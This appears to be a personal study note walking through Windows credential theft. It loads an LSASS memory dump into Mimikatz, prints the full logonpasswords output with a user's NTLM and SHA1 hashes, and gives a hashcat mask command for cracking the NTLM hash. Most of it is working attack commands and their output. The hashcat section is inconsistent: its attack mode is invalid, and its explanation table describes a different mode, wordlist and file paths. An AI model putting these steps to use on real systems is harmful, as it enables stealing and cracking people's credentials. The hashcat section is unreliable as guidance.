



1. Download **MiMiKatz** from the developer's GitHub page : 
   
   https://github.com/gentilkiwi/mimikatz/releases



2. Run **MiMiKatz** : 
   
   
   `C:\ > mimikatz.exe`


3. Load the *LSASS Dump File* :

`MiMiKatz # sekurlsa::MINIDUMP C:\Users\bryce\Desktop\LSASS\lsass.dmp`

>[!output]
>
>`switch to MINIDUMP : ...lsass.dmp`

4. Obtain the **Login Passwords** :

`MiMiKatz # sekurlsa::logonpasswords`


>[!output]
>
>Opening : 'C:\Users\bryce\Desktop\LSASS\lsass.dmp' file for minidump...  
  
Authentication Id : 0 ; 180960 (00000000:0002c2e0)  
Session : Interactive from 1  
User Name : bryce  
Domain : BRYCE  
Logon Server : BRYCE  
Logon Time : 10/11/2024 10:47:33 AM  
SID : S-1-5-21-1667131620-79868946-2467670277-1000  
msv :  
[00000003] Primary  
* Username : bryce  
* Domain : BRYCE  
* NTLM : **40af265d83a38cc8fdc05f5ccaaf4cfd**  
* SHA1 : 2e82e891e5b20d88a746ea8781710c77e170173c  
tspkg :  
wdigest :  
* Username : bryce  
* Domain : BRYCE  
* Password : (null)  
kerberos :  
* Username : bryce  
* Domain : BRYCE  
* Password : (null)  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 180904 (00000000:0002c2a8)  
Session : Interactive from 1  
User Name : bryce  
Domain : BRYCE  
Logon Server : BRYCE  
Logon Time : 10/11/2024 10:47:33 AM  
SID : S-1-5-21-1667131620-79868946-2467670277-1000  
msv :  
[00000003] Primary  
* Username : bryce  
* Domain : BRYCE  
* NTLM : **40af265d83a38cc8fdc05f5ccaaf4cfd**  
* SHA1 : 2e82e891e5b20d88a746ea8781710c77e170173c  
tspkg :  
wdigest :  
* Username : bryce  
* Domain : BRYCE  
* Password : (null)  
kerberos :  
* Username : bryce  
* Domain : BRYCE  
* Password : (null)  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 997 (00000000:000003e5)  
Session : Service from 0  
User Name : LOCAL SERVICE  
Domain : NT AUTHORITY  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:40 AM  
SID : S-1-5-19  
msv :  
tspkg :  
wdigest :  
* Username : (null)  
* Domain : (null)  
* Password : (null)  
kerberos :  
* Username : (null)  
* Domain : (null)  
* Password : (null)  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 50507 (00000000:0000c54b)  
Session : Interactive from 1  
User Name : DWM-1  
Domain : Window Manager  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:39 AM  
SID : S-1-5-90-0-1  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 50459 (00000000:0000c51b)  
Session : Interactive from 1  
User Name : DWM-1  
Domain : Window Manager  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:39 AM  
SID : S-1-5-90-0-1  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 996 (00000000:000003e4)  
Session : Service from 0  
User Name : BRYCE$  
Domain : WORKGROUP  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:38 AM  
SID : S-1-5-20  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
* Username : bryce$  
* Domain : WORKGROUP  
* Password : (null)  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 28860 (00000000:000070bc)  
Session : Interactive from 1  
User Name : UMFD-1  
Domain : Font Driver Host  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:38 AM  
SID : S-1-5-96-0-1  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 28802 (00000000:00007082)  
Session : Interactive from 0  
User Name : UMFD-0  
Domain : Font Driver Host  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:38 AM  
SID : S-1-5-96-0-0  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 27954 (00000000:00006d32)  
Session : UndefinedLogonType from 0  
User Name : (null)  
Domain : (null)  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:38 AM  
SID :  
msv :  
tspkg :  
wdigest :  
kerberos :  
ssp :  
credman :  
cloudap :  
  
Authentication Id : 0 ; 999 (00000000:000003e7)  
Session : UndefinedLogonType from 0  
User Name : BRYCE$  
Domain : WORKGROUP  
Logon Server : (null)  
Logon Time : 10/11/2024 9:06:37 AM  
SID : S-1-5-18  
msv :  
tspkg :  
wdigest :  
* Username : BRYCE$  
* Domain : WORKGROUP  
* Password : (null)  
kerberos :  
* Username : bryce$  
* Domain : WORKGROUP  
* Password : (null)  
ssp :  
credman :  
cloudap :



5. Let us crack the NTLM hash with **HashCat** : 


hashcat -m 1000 -a 1000 -o /home/cody/Desktop/cracked_secrets_ntlm_mask.txt "hashcontents" ?l?l?l?l?l?d


Explanation : 


|                                         |                                                                                               |
| --------------------------------------- | --------------------------------------------------------------------------------------------- |
| hashcat                                 | calls the hashcat program                                                                     |
| -m                                      | specify the hash type                                                                         |
| 0 (1000 for NTLM)                       | '0' after '-m' indicates a hash type of MD5                                                   |
| -a                                      | specify the attack mode                                                                       |
| 0                                       | '0' after '-a' indicates an attack mode of "Straight" (wordlist)                              |
| -o                                      | specify where to output results                                                               |
| /home/cody/Desktop/cracked_secrets.txt  | preceded by '-o', the file_path+file_name of where to store the output of the cracked hashes. |
| /home/cody/Desktop/secure_passwords.txt | list of hashes                                                                                |
| /usr/share/wordlists/rockyou.txt        | full path and filename for the wordlist we are using                                          |

l?l?l?l?l?d is a **Guess Mask**, where we use it to cut down on the time necessary to crack the hash (if we know how many characters the password is)



>[!info]
>
>Source : 
>
>[Hashcat - Cracking MD5 and NTLM Hashes (codyrichardson.io)](https://blog.codyrichardson.io/2020/06/hashcat-cracking-md5-and-ntlm-hashes.html)


